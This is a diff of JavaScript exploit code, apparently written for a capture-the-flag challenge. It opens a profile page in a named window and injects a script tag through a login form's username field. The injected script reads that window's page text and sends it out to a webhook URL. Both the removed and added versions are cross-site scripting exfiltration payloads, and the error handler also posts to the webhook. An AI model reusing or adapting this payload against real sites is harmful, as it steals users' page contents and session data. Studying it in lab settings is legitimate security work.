@@ -15,24 +15,20 @@ function post(url, data) {
   return xhr.send(data);
 }
 
-const queryString = window.location.search;
-const urlParams = new URLSearchParams(queryString);
-const id = urlParams.get("id");
+// const queryString = window.location.search;
+// const urlParams = new URLSearchParams(queryString);
+// const id = urlParams.get("id");
 
 try {
-  if (id == 1) {
-    window.open(PROFILE, "first");
-    const me = window.open(ORIGIN + "?id=2", "first");
-    setTimeout(() => (me.location = PROFILE), 3000);
-  } else if (id == 2) {
-    const payload = `<script>
-const content = window.open('', 'first').document.body.innerHTML;
-window.location = "${WEBHOOK}?" + content;
-</script>`;
-    document.getElementById("login").submit();
-  } else {
-    post(WEBHOOK, `ID was ${id}`);
-  }
+  const profile = window.open(PROFILE, "rootme");
+
+  const payload = `
+window.location = "${WEBHOOK}?" + rootme.document.body.innerText;
+`;
+  document.getElementById("username").value = `<script>${payload}</script>`;
+  document.getElementById("login").submit();
+
+  window.open("", "rootme");
 } catch (error) {
   post(WEBHOOK, `Error ${id}: ${error}`);
 }
